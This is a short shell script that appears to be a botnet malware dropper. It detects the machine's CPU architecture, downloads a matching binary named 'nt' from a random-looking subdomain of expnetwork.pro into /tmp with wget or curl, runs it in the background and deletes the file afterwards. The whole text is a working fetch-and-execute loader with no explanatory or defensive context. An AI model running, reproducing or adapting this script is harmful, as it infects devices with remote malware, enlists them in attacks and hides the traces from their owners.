#!/bin/sh

URL="http://zcxrhxvzomjvimghksngrmlbmqowfazmzvlbjolihytuwfwpslctbscvsdjyno.expnetwork.pro"

A=$(uname -m)

case "$A" in
    mips)
        T="mips" ;;
    mipsel|mipsle|*mips*)
        T="mpsl" ;; 
    aarch64|arm64)
        T="arm64" ;;
    arm*)
        T="arm" ;;
    x86_64|amd64)
        T="x86" ;;
    i*86)
        T="x86" ;;
    ppc*|powerpc*)
        T="ppc" ;;
    sh4*)
        T="sh4" ;;
    m68k*)
        T="m68k" ;;
    *)	
        T="mips" ;;
esac

cd /tmp
BIN="nt.$T"

wget $URL/$BIN -O nt || curl -L $URL/$BIN -o nt

if [ -f "nt" ]; then
    chmod +x nt
    ./nt &
    sleep 1
    rm -f nt
fi